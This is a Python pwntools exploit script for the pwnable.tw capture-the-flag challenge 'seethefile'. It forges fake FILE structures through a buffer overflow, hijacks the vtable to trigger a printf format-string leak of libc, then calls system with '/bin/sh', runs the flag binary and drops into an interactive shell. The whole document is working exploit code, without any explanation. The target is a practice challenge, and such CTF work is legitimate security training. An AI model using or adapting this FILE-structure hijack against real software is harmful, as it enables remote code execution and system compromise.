from pwn import *
elf = ELF("./seethefile")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
target=remote('chall.pwnable.tw' ,10200)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def fopen(name):
	sla("choice :",str(1))
	sla("see :",name)

def fread():
	sla("choice :",str(2))

def leave(payload="A"):
	sla("choice :",b"5"+b"\x41\x41\x41"+p32(elf.got["exit"]))
	sla("name :",payload)	

def pack_file(_flags = 0,
              _IO_write_end = 0x21,
              _IO_buf_base = 0x21,
              _IO_buf_end = 0x21,
              _IO_save_base = 0x0,
              _IO_backup_base = 0x21,
              _IO_save_end = 0x21,
              _IO_marker = 0x21,
              _IO_chain = 0x21,
              _fileno = 0x21,
              _lock = 0):
    struct = bytes(_flags,encoding='ASCII')+ p32(_IO_write_end) + p32(_IO_buf_base) + p32(_IO_buf_end) + p32(_IO_save_base) + p32(_IO_backup_base) + \
             p32(_IO_save_end) + p32(_IO_marker) + p32(_IO_chain) +p32(_fileno)
    struct = struct.ljust(0x48, b"\x00")
    struct += p32(_lock)
    struct = struct.ljust(0x94, b"\x00")
    return struct

fp=b"A"*0x20+p32(0x804b288)+p32(0x39)
fp+=pack_file(_flags="\x40\x40%2$p%"+str(0x8a37-12)+"x%24$hn\x00\x00\x00\x00\x00",_lock=0x804B0E0)
fp+=p32(0x804b31c)
fp+=p32(0)
fp+=p32(elf.symbols["printf"])
leave(fp)
target.recvuntil("0x")
libc_base=int(target.recv(8),16)-0x41bcb
libc_system=libc_base+libc.symbols["system"]
fp=b"A"*0x20+p32(0x804b288)+p32(0x39)
fp+=pack_file(_flags="\x40\x40;/bin/sh"+"\x00"*14,_lock=0x804B0E0)
fp+=p32(0x804b31c)
fp+=p32(0)
fp+=p32(libc_system)
leave(fp)
target.sendline("cd /home/seethefile;./get_flag")
sla("magic :","Give me the flag\x00")
target.interactive()
